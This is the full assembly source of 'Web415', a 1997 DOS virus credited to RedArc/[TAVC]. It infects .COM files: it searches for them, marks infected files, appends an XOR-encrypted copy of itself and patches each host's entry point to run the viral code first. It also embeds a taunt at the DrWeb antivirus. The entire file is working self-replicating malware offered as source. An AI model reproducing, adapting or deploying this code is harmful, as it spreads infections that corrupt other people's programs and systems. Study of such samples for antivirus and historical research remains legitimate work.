;----------------------------------------------------------------------------
;                              Вирус Web415
;                            Семейство Search
;----------------------------------------------------------------------------
;           (c) 1997 by I. Dikshew // [TAVC] // -=* Red Arc *=-
;----------------------------------------------------------------------------

Model Tiny
.Code
.286
org 100h
start:
       push cs
       push offset Entry
       retf
       db 'DrWeb - горбуха!'
BEG_LEN equ $-start
Entry:
      pusha
      push ds
      push es
      call En1
EN_LEN equ $-Entry
En1:
     push ds
     pop es
     xchg ax,di
     pop bp
     sub bp,EN_LEN
     mov bx,1100h
     mov ah,4ah
     int 21h
     jnc ALLOCATED
Exit_Proc:
     pop es
     pop ds
     popa
     push cs
     push si
     retf
ALLOCATED:
     mov ax,LBL
     add ax,bp
     mov cl,4
     shr ax,cl
     inc ax
     push ds
     pop bx
     add ax,bx
     push ax
     push cs
     pop ds
     pop es
LBL10:
     mov si, bp
     cld
     xor cx,cx
     add si, Crypt_Start
LBL0:
     mov ax,word ptr ds:[si]
     inc cx
     mov bx,word ptr ds:[si+2]
     inc cx
     xchg ah,al
     inc cx
     xchg bh,bl
     inc cx
     xchg ax,bx
     xor ax,0BEBEh
     xor bx,0BEBEh
     mov word ptr ds:[si],ax
     mov word ptr ds:[si+2],bx
     add si,4
     cmp cx, Crypt_LEN
     jge LBL1
     jmp short LBL0
LBL1:
Crypt_Start equ $-Entry
     mov ah,1ah
     mov dx,bp
     add dx,Crypt_End
     mov bx,dx
     int 21h
     push es
     push cs
     pop es
     mov di,100h
     mov si,bp
     add si,Old_BEGIN
     mov cx,BEG_LEN
     rep movsb
     pop es
     mov byte ptr ds:[bp+Count],0
     cld
     mov ah,4eh
     mov cx, 20h
     mov dx,bp
     add dx,C_Mask
Interrupt:
     int 21h
     jb Not_Found
     jmp Test_File
Not_Found:
     mov ah,1ah
     mov dx,80h
     int 21h
     jmp Exit_Proc
Test_File:
     push bx
     add bx,1ah
     mov ax,[bx]
     and ax,0f000h
     cmp ax,0f000h
     jnz Len_Tested
Find_Next:
     pop bx
     mov ah,4fh
     jmp Short Interrupt
Len_Tested:
     add bx,04h
     xchg dx,bx
     mov ax,3d02h
     int 21h
     xchg ax,bx
     mov ah,3fh
     mov cx,BEG_LEN
     mov dx,bp
     add dx,Old_BEGIN
     push dx
     int 21h
     pop si
     cmp byte ptr ds:[si+14h],'!'
     je Close_File
     jmp short Uses_File
Close_File:
     mov ah,3eh
     int 21h
     mov al,byte ptr ds:[bp+Count]
     cmp al,1
     jne Find_Next
     pop bx
     jmp Not_Found
Uses_File:
     mov ax,4202h
     xor cx,cx
     xor dx,dx
     int 21h
     push ax
     cld
     mov si,bp
     xor di,di
     mov cx, Crypt_End / 2
     rep movsw
     pusha
     push es
     pop ds
     xor cx,cx
     mov si, Crypt_Start
LBL_0:
     mov ax,word ptr ds:[si]
     inc cx
     mov bx,word ptr ds:[si+2]
     inc cx
     xchg ah,al
     inc cx
     xchg bh,bl
     inc cx
     xchg ax,bx
     xor ax,0BEBEh
     xor bx,0BEBEh
     mov word ptr ds:[si],ax
     mov word ptr ds:[si+2],bx
     add si,4
     cmp cx, Crypt_LEN
     jge LBL_1
     jmp short LBL_0
LBL_1:
     popa
     mov ah,40h
     mov cx,Crypt_End
     xor dx,dx
     int 21h
     mov ax,4200h
     xor cx,cx
     xor dx,dx
     int 21h
     push cs
     pop ds
     pop ax
     pop si
     push si
     mov di,bp
     add ax,100h
     add di,New1
     inc di
     mov [di],ax
     mov ah,40h
     mov dx,bp
     add dx,New_BEGIN
     mov cx,BEG_LEN
     int 21h
     mov byte ptr ds:[bp+Count],1
     jmp Close_File

C_MASK equ $-Entry
db '*.com',0h

New_BEGIN equ $-Entry
       push cs
LI:
New1 equ $-Entry
       push offset Entry
       retf
Apll equ $-Entry
Rems equ $-LI
       db 'DrWeb - горбуха!'

Old_BEGIN equ $-Entry
       db 0c3h
       db BEG_LEN-1 dup (90h)

Count equ $-Entry
      db ?

db 'RedArc // [TAVC]'

Crypt_End equ $-Entry
Crypt_LEN equ $-LBL1

LBL equ $-Entry

end start
